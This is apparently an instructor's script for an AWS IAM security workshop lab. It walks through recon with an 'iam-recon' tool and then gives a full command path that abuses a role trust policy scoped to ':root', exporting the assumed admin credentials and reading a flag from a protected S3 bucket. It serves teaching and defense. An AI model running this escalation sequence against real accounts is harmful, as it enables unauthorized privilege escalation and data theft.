# Scenario 2 — Attack bullets (morning, ~15 min)

Source: Lab 1 Exercise 4. Identity: `iamws-role-assumer-user`. Target: crown jewels via assuming `iamws-privileged-admin-role` (trusts `:root`).

## Pre-attack — recon with iam-recon

- `iam-recon --account $ACCOUNT_ID argquery --preset privesc` → shows the STS edge from user → privileged-admin-role.
- `iam-recon --account $ACCOUNT_ID argquery --principal user/iamws-role-assumer-user --action sts:AssumeRole --resource 'arn:aws:iam::*:role/iamws-privileged-admin-role'` → ALLOW line confirms the permission.
- `iam-recon --account $ACCOUNT_ID pathfinding` → also surfaces `[sts-001]` (Principal Access via permissive trust).
- In the interactive viz, click the STS edge — iam-recon displays the trust policy text inline (`:root` is the smoking gun).

## Exploit — full command path

```bash
# Step 1: confirm identity
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-role-assumer-user)
aws sts get-caller-identity --profile iamws-role-assumer-user

# Step 2: inspect the vulnerable trust policy
aws iam get-role --role-name iamws-privileged-admin-role \
  --query 'Role.AssumeRolePolicyDocument' --output json \
  --profile iamws-role-assumer-user
# note: Principal: arn:aws:iam::${ACCOUNT_ID}:root — trusts the whole account

# Step 3: try the crown jewels → DENIED
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-role-assumer-user
# expect: AccessDenied / Forbidden

# Step 4: assume the privileged admin role
ADMIN_CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-privileged-admin-role \
  --role-session-name escalated \
  --query "Credentials" --output json \
  --profile iamws-role-assumer-user)

export AWS_ACCESS_KEY_ID=$(echo $ADMIN_CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $ADMIN_CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $ADMIN_CREDS | jq -r '.SessionToken')

# Step 5: claim the crown jewels with elevated creds
aws sts get-caller-identity   # shows iamws-privileged-admin-role
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt -

# Cleanup
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

## Demo bullets

- Walk participants through the trust policy display in iam-recon's interactive viz — point at the `:root` principal.
- Compare to a properly-scoped trust (will appear in afternoon defense).
- Note: iam-recon's policy simulator counts `:root` as "any principal with sts:AssumeRole in the account."
